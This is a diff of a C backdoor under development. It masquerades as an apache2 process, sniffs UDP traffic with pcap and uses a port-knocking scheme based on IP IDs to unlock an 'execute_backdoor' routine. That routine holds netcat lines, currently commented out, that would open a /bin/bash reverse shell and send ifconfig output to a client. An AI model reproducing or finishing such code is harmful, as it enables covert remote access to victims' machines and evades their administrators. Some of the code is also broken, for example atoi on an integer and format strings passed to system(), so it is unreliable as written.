@@ -31,7 +31,7 @@
 #include <sys/types.h>
 #include <sys/prctl.h>
 
-#include <net/ethernet.h>
+#include <netinet/ether.h>
 #include <netinet/ip.h>
 #include <netinet/udp.h>
 #include <pcap.h>
@@ -43,10 +43,9 @@
 
 #define BIT_SET(a,b) ((a) |= (1<<(b)))
 #define MASK "/usr/sbin/apache2 -k start -DSSL"
-#define NIC "wlp3s0"
+#define NIC "wlan0"
 
 #define DEST_ADDR "127.0.0.1"
-#define DEST_PORT "50000"
 
 unsigned char lock = 0b000;
 
@@ -103,15 +102,18 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 {
 	int size = header->len;
 	int guess;
+	char sourceIP[INET_ADDRSTRLEN];
 	unsigned short iphdrlen;
-	struct sockaddr_in source;
+	struct in_addr source;
 
-	struct iphdr *iph = (struct iphdr*)(packet + sizeof(struct ethhdr));
+	struct iphdr *iph = (struct iphdr*)(packet + sizeof(struct ether_header));
 	iphdrlen = iph->ihl * 4;
 
-	struct udphdr *udph = (struct udphdr*)(packet + iphdrlen + sizeof(struct ethhdr));
+	struct udphdr *udph = (struct udphdr*)(packet + iphdrlen + sizeof(struct ether_header));
 
-	source.sin_addr.s_addr = iph->saddr);
+	memset(&source, 0, sizeof(source));
+	source.s_addr = iph->saddr;
+	inet_ntop(AF_INET, &source, sourceIP, sizeof sourceIP);
 
 	int sPort = ntohs(udph->source);
 	// make sure udp
@@ -119,27 +121,28 @@ void process_packet(u_char *args, const struct pcap_pkthdr *header, const u_char
 	{
 		int id = ntohs(iph->id);
 		int dPort = ntohs(udph->dest);
+
+		printf("%d %d\n", id, dPort);
 		
-		guess = (id % 100) + (dPort % 100);
+		guess = (id % 100);
 		switch(guess)
 		{
 			case R_KEY:
 				BIT_SET(lock, 0);
-				check_lock(iph->saddr, DEST_PORT);
+				check_lock(sourceIP, dPort);
 				break;
 			case G_KEY:
 				BIT_SET(lock, 1);
-				check_lock(iph->saddr, DEST_PORT);
+				check_lock(sourceIP, dPort);
 				break;
 			case B_KEY:
 				BIT_SET(lock, 2);
-				check_lock(iph->saddr, DEST_PORT);
+				check_lock(sourceIP, dPort);
 				break;
 			default:
 				break;
 		}
 	}
-	printf("%s\n", inet_ntoa(source.sin_addr));
 }
 
 
@@ -162,7 +165,7 @@ void execute_backdoor(int addr, int port)
 	printf("executing...\n");
 	// send shell to client
 	//system("nc %s %d -e /bin/bash", addr, port);
-	system("ifconfig << info.txt");
+	//system("ifconfig << info.txt");
 	//system("nc %s %d -e < info.txt", addr, port);
 }
 
@@ -181,7 +184,7 @@ int send_info(char buffer[])
 	}
 
 	server = DEST_ADDR;
-	portno = atoi(DEST_PORT);
+	portno = atoi(8888);
 
 	bzero((char*) &dest, sizeof(dest));
 
@@ -225,7 +228,7 @@ int main(int argc, char *argv[])
 {
 	char *dev;
 	char errbuf[PCAP_ERRBUF_SIZE];
-	char filter_exp[] = "udp dst port 53";  // filter expression
+	char filter_exp[] = "udp src port 53";  // filter expression
 	const u_char *packet;
 
 	struct bpf_program fp;  // compiled filter expression
